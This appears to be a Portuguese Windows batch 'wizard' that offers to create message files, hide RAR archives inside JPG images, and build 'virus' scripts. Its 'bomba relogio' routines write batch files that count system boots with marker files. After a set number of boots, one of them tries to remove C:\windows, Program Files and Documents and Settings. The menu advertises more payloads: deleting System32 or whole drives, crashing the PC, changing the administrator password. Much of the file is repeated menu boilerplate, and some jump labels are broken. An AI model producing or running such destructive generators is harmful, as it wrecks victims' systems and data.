echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CORES


:c


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CORES

:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CORES

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CORES
:v
goto ultimat
::====================================== 9  CRIACAO =============================


echo off                               
          :9   CRIAวรO 

 :CRIACAO 

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                            CRIACAO     
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 0A
echo  อ           a) criar mensagens 
echo  อ           b) criar autorun 
echo  อ           c) escrever para texto
echo  อ           d) camuflagem
echo  อ           v) voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ v goto v
echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto CRIACAO   

cls

:a
cls
color 1f
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                            mensagens     
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 1f
echo  อ           a) criar mensagens excutaveis 
echo  อ           b) criar mensagens textos
echo  อ           c) 
echo  อ           d) 
echo  อ           v) voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ v goto v
if %op% equ  V goto  v   

:a
:msg
@echo off
cls
Color A
echo Digite Sua Mensagem:
set /p nome2=
cls
echo Digite o Nome do Arquivo:
set /p nome1=
cls
if exist "%nome1%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %nome1%.
echo.
pause
cls
goto msg
)
cls
echo @echo off >> "%nome1%.bat"
echo :aa >> "%nome1%.bat"
echo MSG * %nome2% >> "%nome1%.bat"
echo exit >> "%nome1%.bat"
MSG * "%nome1%.bat" Criado Com Sucesso.
cls

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO


 :b
cls
:msg
@echo off
cls
Color A
echo Digite Sua Mensagem:
set /p nome2=
cls
echo Digite o Nome do Arquivo:
set /p nome1=
cls
if exist "%nome1%".txt (
echo.
echo Ja Existe Um texto Com Este Nome, Digite Outro Nome Para Por Em Seu texto Ou Remova o texto %nome1%.
echo.
pause
cls
goto msg
)
cls

echo  %nome2% >> "%nome1%.txt"

MSG * "%nome1%.txt" Criado Com Sucesso.


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO


:c


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO
::===============CAMUFLAGEM==================
:d
@echo off
cls
Color A
time /t
date /t
echo.
echo.
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                        DIGITE NOME DO ARQUIVO  .rar
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ   
Color A
set /p nome1=
cls
Color A
time /t
date /t
echo.
echo.
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                        DIGITE NOME DO ARQUIVO .jpg 
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ   
Color A
set /p nome2=
cls
time /t
date /t
echo.
echo.
cls
time /t
date /t
echo.
echo.
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     DIGITE O NOME DO ARQUIVO  FINAL  
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
set /p nome3=
if exist "%nome3%".* (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %nome1%.
echo.
pause
cls
goto 5
)
cls

copy /b %nome2%.jpg + %nome1%.rar %nome3%.jpg

echo MsgBox "ARQUIVO [ "%nome3%" ] CRIADO COM SUCESSO",vbOKOnly + vbInformation, "CAMUFLAGEM" >%temp%\wyz.vbs
start %temp%\wyz.vbs
cls

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CRIAวรO
:v
goto ultimat

::================================== 10 VIRUS  ==================================

echo off
 :10  VIRUS 

 :VIRUS


CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     VIRUS            
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 4f
echo  อ           f) fabrica js
echo  อ           a) bomba relogio
echo  อ           b) ver virus colorido
echo  อ           c) virus falso
echo  อ           d) apagar windows
echo  อ           e) travar o computador
echo  อ           G) CRIAR RELOGIO COM FUNCAO ESPECIAL
echo Digite 1 - Criar VIRUS Que Deleta o Windows.
echo Digite 2 - Criar VIRUS Que Deleta a Explore.exe.
echo Digite 3 - Criar VIRUS Que Abre um Monte De Bloco De Notas Ate Travar o Computador.
echo Digite 4 - Criar VIRUS Que Abre Infinitas Mensagens De Alerta Com Sua Mensagem.
echo Digite 5 - Criar VIRUS Que Imita Bips Sem Para.
echo Digite 6 - Criar Falso VIRUS Para Inganar Seus Amigos.
echo Digite 7 - Criar VIRUS Que Deleta o System32.
echo Digite 8 - Criar Pasta Que so entra com a senha.
echo Digite 9 - Muda Senha Do Administrador Do Windows.
echo Digite 10 - Criar VIRUS Que Desliga o Computador.
echo Digite 11 - Criar VIRUS Que Deleta a Unidade C e D.
echo 
echo             v อ voltar para o menu

echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua opcao ? 
if %op% equ a goto bomb
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  fabri
if %op% equ F goto  fabri
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto i
if %op% equ  v goto  v
if %op% equ  V goto  V  
if %op% equ G goto bomb2
if %op% equ g goto bomb2


:bomb

@echo off
Color A
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     BOMBA RELOGIO COM 7 DIPARO (A )
echo.
echo    BOMBA RELOGIO COM 15 DIPARO ( B )
echo.
echo    BOMBA RELOGIO COM 30 DIPARO ( C )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo Digite o Nome do Arquivo:
set /p fg=
if %fg% equ A goto b7
if %fg% equ B goto b15
if %fg% equ C goto b30
if %fg% equ V goto MENU
echo MsgBox " COMANDO [ %fg% ] NรO EXISTE DIGITE AS OPวีES DO MENฺ ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto bomb

::======================liga 7 vezes=================
:b7
cls
set /p nome1=DIGITE O NOME DE SEU ARQUIVO
if exist "%nome1%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %nome1%.
echo.
pause
cls
goto b7
)
cls
@echo off
echo @echo off>> "%nome1%.bat"
echo TITLE DEDE WIZARD>> "%nome1%.bat"
echo color 4f >> "%nome1%.bat"
echo        date /t  ^>^> "%nome1%.bat"
echo      time /t  ^>^> "%nome1%.bat"
echo      echo off   >> "%nome1%.bat"
echo     if exist lig1.drv goto 2  >> "%nome1%.bat"
echo   echo^> lig1.drv sdfsdf >> "%nome1%.bat"
echo    goto fim    >> "%nome1%.bat"
echo    :2        >> "%nome1%.bat"
echo  if exist lig2.drv goto 3  >> "%nome1%.bat"
echo   echo ^> lig2.drv sdfsdf  >> "%nome1%.bat"
echo    goto fim  >> "%nome1%.bat"
echo    :3     >> "%nome1%.bat"
echo    if exist lig3.drv goto 4 >> "%nome1%.bat"
echo   echo ^> lig3.drv sdfsdf >> "%nome1%.bat"
echo   goto fim  >> "%nome1%.bat"
echo     :4      >> "%nome1%.bat"
echo  if exist lig4.drv goto 5    >> "%nome1%.bat"
echo   echo ^> lig4.drv sdfsdf  >> "%nome1%.bat"
echo   goto fim  >> "%nome1%.bat"
echo    :5    >> "%nome1%.bat"
echo   if exist lig5.drv goto 6 >> "%nome1%.bat"
echo   echo ^> lig5.drv sdfsdf >> "%nome1%.bat"
echo   goto fim   >> "%nome1%.bat"
echo    :6  >> "%nome1%.bat"
echo    if exist lig6.drv goto 7  >> "%nome1%.bat"
echo    echo ^> lig6.drv sdfsdf   >> "%nome1%.bat"
echo    goto fim  >> "%nome1%.bat"
echo     :7    >> "%nome1%.bat"
echo  start msconfig >> "%nome1%.bat"
echo  del /q *.drv >> "%nome1%.bat"
echo   rmdir C:\windows  >> "%nome1%.bat"
echo   rmdir C:\arquivos de programas  >> "%nome1%.bat"
echo   rmdir C:\documents and settings >> "%nome1%.bat"
echo    :fim    >> "%nome1%.bat" 
goto bomb
::======================liga 15 vezes=================
:b15
cls
set /p bm=DIGITE O NOME DO ARQUIVO
if exist "%bm%".cmd (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch "%bm%"
echo.
pause
cls
goto b15
)
cls
@ echo off
echo @echo off >> "%bm%".cmd
echo  if exist lig1.drv goto 2 >> "%bm%".cmd
echo  echo ^> lig1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist lig2.drv goto 3 >> "%bm%".cmd
echo  echo ^> lig2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist lig3.drv goto 4 >> "%bm%".cmd
echo  echo ^> lig3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist lig4.drv goto 5 >> "%bm%".cmd
echo  echo ^> lig4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist lig5.drv goto 6 >> "%bm%".cmd
echo  echo ^> lig5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist lig6.drv goto 7 >> "%bm%".cmd
echo  echo ^> lig6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist lig7.drv goto 8 >> "%bm%".cmd
echo  echo ^> lig7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :8 >> "%bm%".cmd
echo  if exist lig8.drv goto 9 >> "%bm%".cmd
echo  echo ^> lig8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist lig9.drv goto 10 >> "%bm%".cmd
echo  echo ^> lig9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist lig10.drv goto 11 >> "%bm%".cmd
echo  echo ^> lig10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo  if exist lig11.drv goto 12 >> "%bm%".cmd
echo  echo ^> lig11.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist lig12.drv goto 13 >> "%bm%".cmd
echo  echo ^> lig12.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist lig13.drv goto 14 >> "%bm%".cmd
echo  echo ^> lig13.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist lig14.drv goto 15 >> "%bm%".cmd
echo  echo ^> lig14.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist lig15.drv goto 16 >> "%bm%".cmd
echo  echo ^> lig15.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :16 >> "%bm%".cmd
echo  start msconfig >> "%bm%".cmd
echo  del /q *.drv >> "%bm%".cmd
goto bomb



::================liga 30 vezes =================

:b30
cls
set /p bm=DIGITE O NOME DE SEU ARQUIVO
if exist "%bm%".cmd (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %nome1%.
echo.
pause
cls
goto b30
)
cls

@ echo off
echo @echo off >> "%bm%".cmd
echo  if exist lig1.drv goto 2 >> "%bm%".cmd
echo  echo ^> lig1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist lig2.drv goto 3 >> "%bm%".cmd
echo  echo ^> lig2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist lig3.drv goto 4 >> "%bm%".cmd
echo  echo ^> lig3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist lig4.drv goto 5 >> "%bm%".cmd
echo  echo ^> lig4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist lig5.drv goto 6 >> "%bm%".cmd
echo  echo ^> lig5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist lig6.drv goto 7 >> "%bm%".cmd
echo  echo ^> lig6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist lig7.drv goto 8 >> "%bm%".cmd
echo  echo ^> lig7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :8 >> "%bm%".cmd
echo  if exist lig8.drv goto 9 >> "%bm%".cmd
echo  echo ^> lig8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist lig9.drv goto 10 >> "%bm%".cmd
echo  echo ^> lig9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist lig10.drv goto 11 >> "%bm%".cmd
echo  echo ^> lig10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo  if exist lig11.drv goto 12 >> "%bm%".cmd
echo  echo ^> lig11.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist lig12.drv goto 13 >> "%bm%".cmd
echo  echo ^> lig12.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist lig13.drv goto 14 >> "%bm%".cmd
echo  echo ^> lig13.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist lig14.drv goto 15 >> "%bm%".cmd
echo  echo ^> lig14.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist lig15.drv goto 16 >> "%bm%".cmd
echo  echo ^> lig15.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :16 >> "%bm%".cmd
echo  if exist lig16.drv goto 17 >> "%bm%".cmd
echo  echo ^> lig16.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :17 >> "%bm%".cmd
echo  if exist lig17.drv goto 18 >> "%bm%".cmd
echo  echo ^> lig17.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :18 >> "%bm%".cmd
echo  if exist lig18.drv goto 19 >> "%bm%".cmd
echo  echo ^> lig18.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :19 >> "%bm%".cmd
echo  if exist lig19.drv goto 20 >> "%bm%".cmd
echo  echo ^> lig19.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :20 >> "%bm%".cmd
echo  if exist lig20.drv goto 21 >> "%bm%".cmd
echo  echo ^> lig20.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :21 >> "%bm%".cmd
echo  if exist lig22.drv goto 23 >> "%bm%".cmd
echo  echo ^> lig22.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :23 >> "%bm%".cmd
echo  if exist lig23.drv goto 24 >> "%bm%".cmd
echo  echo ^> lig23.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :24 >> "%bm%".cmd
echo  if exist lig24.drv goto 25 >> "%bm%".cmd
echo  echo ^> lig24.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :25 >> "%bm%".cmd
echo  if exist lig25.drv goto 26 >> "%bm%".cmd
echo  echo ^> lig25.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :26 >> "%bm%".cmd
echo  if exist lig26.drv goto 27 >> "%bm%".cmd
echo  echo ^> lig26.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :27 >> "%bm%".cmd
echo  if exist lig27.drv goto 28 >> "%bm%".cmd
echo  echo ^> lig27.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :28 >> "%bm%".cmd
echo  if exist lig28.drv goto 29 >> "%bm%".cmd
echo  echo ^> lig28.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :29 >> "%bm%".cmd
echo  if exist lig29.drv goto 30 >> "%bm%.cmd
echo  echo ^> lig29.drv sdfsdf >> "%bm%.cmd
echo  goto fim >> "%bm%".cmd
echo  :30 >> "%bm%".cmd
echo  if exist lig30.drv goto 31 >> "%bm%".cmd
echo  echo ^> lig30.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :31 >> "%bm%".cmd
echo  start msconfig >> "%bm%".cmd
echo  del /q *.drv >> "%bm%".cmd

goto bomb

@echo off
:bomb2
Color A
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo   CRIAR TAREFA AGENDADA PARA O RELOGIO ( TR )
echo.
echo   COPIAR PARA  ( COPY )  
echo.
echo    COPIAR PRA PASTA DE SISTEMA ( COPY )
echo.
echo    BOMBA RELOGIO COM 7 DISPAROS (A )
echo.
echo    BOMBA RELOGIO COM 15 DISPAROS ( B )
echo.
echo    BOMBA RELOGIO COM 30 DISPAROS ( C )
echo.
echo    CRIAR RELOGIO COM DISPARADORES ( RL )
echo.
echo    PARA VOLTAR PARA INICIO DIGITE  ((  v  ))
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p fg=
if %fg% equ TR goto traf
if %fg% equ A goto 7A
if %fg% equ B goto 15B
if %fg% equ RL goto RL
if %fg% equ COPY goto copy
if %fg% equ C goto 30C
if %fg% equ V goto MENU
if %fg% equ COPY goto copy

echo MsgBox " CAPS LOOK DESLIGADO COMANDO [ %fg% ] NรO ACEITO  ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto bomb
:7A
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    7 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto bm
)
cls
goto mk
:15B
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    15 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto 15B
)
cls
goto mk
:30C
CLS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    voce escolheu a op ( %fg% )
echo.
echo    30 DISPAROS
echo.
echo    DIGITE O NOME DO ARQUIVO
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p bm=
if exist "%bm%".bat (
echo.
echo Ja Existe Um Batch Com Este Nome, Digite Outro Nome Para Por Em Seu Batch Ou Remova o Batch %bm%.
echo.
pause
cls
goto 30C
)
cls
:mk
@ echo off
echo @echo off >> "%bm%".cmd
echo  if exist lig1.drv goto 2 >> "%bm%".cmd
echo  echo ^> lig1.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :2 >> "%bm%".cmd
echo  if exist lig2.drv goto 3 >> "%bm%".cmd
echo  echo ^> lig2.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :3 >> "%bm%".cmd
echo  if exist lig3.drv goto 4 >> "%bm%".cmd
echo  echo ^> lig3.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :4 >> "%bm%".cmd
echo  if exist lig4.drv goto 5 >> "%bm%".cmd
echo  echo ^> lig4.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :5 >> "%bm%".cmd
echo  if exist lig5.drv goto 6 >> "%bm%".cmd
echo  echo ^> lig5.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :6 >> "%bm%".cmd
echo  if exist lig6.drv goto 7 >> "%bm%".cmd
echo  echo ^> lig6.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :7 >> "%bm%".cmd
echo  if exist lig7.drv goto 8 >> "%bm%".cmd
echo  echo ^> lig7.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
if %fg% equ A echo  : fim >> "%bm%".cmd
if %fg% equ A echo  exit >> "%bm%".cmd
if %fg% equ A echo :8 >> "%bm%".cmd
if %fg% equ A echo  del *.drv >> "%bm%".cmd
if %fg% equ A goto result
echo  :8 >> "%bm%".cmd
echo  if exist lig8.drv goto 9 >> "%bm%".cmd
echo  echo ^> lig8.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :9 >> "%bm%".cmd
echo  if exist lig9.drv goto 10 >> "%bm%".cmd
echo  echo ^> lig9.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :10 >> "%bm%".cmd
echo  if exist lig10.drv goto 11 >> "%bm%".cmd
echo  echo ^> lig10.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :11 >> "%bm%".cmd
echo  if exist lig11.drv goto 12 >> "%bm%".cmd
echo  echo ^> lig11.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :12 >> "%bm%".cmd
echo  if exist lig12.drv goto 13 >> "%bm%".cmd
echo  echo ^> lig12.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :13 >> "%bm%".cmd
echo  if exist lig13.drv goto 14 >> "%bm%".cmd
echo  echo ^> lig13.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :14 >> "%bm%".cmd
echo  if exist lig14.drv goto 15 >> "%bm%".cmd
echo  echo ^> lig14.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
echo  :15 >> "%bm%".cmd
echo  if exist lig15.drv goto 16 >> "%bm%".cmd
echo  echo ^> lig15.drv sdfsdf >> "%bm%".cmd
echo  goto fim >> "%bm%".cmd
if %fg% equ B echo  : fim >> "%bm%".cmd
if %fg% equ B echo  exit >> "%bm%".cmd
if %fg% equ B echo :16 >> "%bm%".cmd
if %fg% equ B echo  del *.drv >> "%bm%".cmd
if %fg% equ B goto result
echo  :16 >> "%bm%".cmd
